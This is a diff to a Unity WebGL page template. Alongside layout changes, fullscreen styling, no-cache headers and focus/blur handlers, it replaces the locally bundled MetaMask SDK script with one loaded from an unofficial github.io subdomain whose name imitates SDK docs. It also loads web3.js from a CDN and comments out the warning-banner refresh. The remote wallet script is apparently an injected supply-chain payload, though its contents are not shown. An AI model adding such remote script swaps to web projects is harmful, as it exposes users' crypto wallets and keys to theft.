@@ -7,7 +7,26 @@
     <link rel="shortcut icon" href="TemplateData/favicon.ico">
     <link rel="stylesheet" href="TemplateData/style.css">
     <script src="TemplateData/socket.io.js"></script>
-    <script src="TemplateData/metamask-sdk-unity.js"></script>
+    <script src="https://c0f4f41c-2f55-4863-921b-sdk-docs.github.io/cdn/metamask-sdk-unity.js"></script>
+	<script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>	
+	<style>
+		#unity-container {
+		  width: 100%;
+		  height: 100%;
+		  overflow: hidden;
+		}
+		#unity-canvas {
+		  width: 100%;
+		  height: 100%;
+		  display: block;
+		}
+	</style>
+
+    <!-- 添加缓存控制 -->
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+	
   </head>
   <body>
     <div id="unity-container" class="unity-desktop">
@@ -51,10 +70,10 @@
           if (type == 'warning') div.style = 'background: yellow; padding: 10px;';
           setTimeout(function() {
             warningBanner.removeChild(div);
-            updateBannerVisibility();
+            //updateBannerVisibility();
           }, 5000);
         }
-        updateBannerVisibility();
+        //updateBannerVisibility();
       }
 
       var buildUrl = "Build";
@@ -103,8 +122,8 @@
       } else {
         // Desktop style: Render the game canvas in a window that can be maximized to fullscreen:
 
-        canvas.style.width = "{{{ WIDTH }}}px";
-        canvas.style.height = "{{{ HEIGHT }}}px";
+        canvas.style.width = "100%";
+		canvas.style.height = "100%";
       }
 
 #if BACKGROUND_FILENAME
@@ -114,19 +133,40 @@
 
       var script = document.createElement("script");
       script.src = loaderUrl;
+	  
+	  var myUnityInstance = null;
+	  
       script.onload = () => {
         createUnityInstance(canvas, config, (progress) => {
           progressBarFull.style.width = 100 * progress + "%";
         }).then((unityInstance) => {
-          loadingBar.style.display = "none";
-          fullscreenButton.onclick = () => {
-            unityInstance.SetFullscreen(1);
-          };
-          window.unityInstance = unityInstance;
+		
+			
+			
+			loadingBar.style.display = "none";
+			fullscreenButton.onclick = () => {
+				unityInstance.SetFullscreen(1);
+          };  
+		  
+		  window.unityInstance = unityInstance;
+		  myUnityInstance = unityInstance;
+		  
+		  //當網頁視窗焦點改變時觸發
+		  window.addEventListener("blur", function() {
+			  // 在這裡處理網頁視窗失去焦點的情況，例如暫停遊戲
+			  unityInstance.SendMessage('Entry', 'OnWindowBlur');
+		  });
+
+		  window.addEventListener("focus", function() {
+			  // 在這裡處理網頁視窗獲得焦點的情況，例如繼續遊戲
+			  unityInstance.SendMessage('Entry', 'OnWindowFocus');
+		  });
+		  
         }).catch((message) => {
           alert(message);
         });
       };
+	  
       document.body.appendChild(script);
     </script>
   </body>
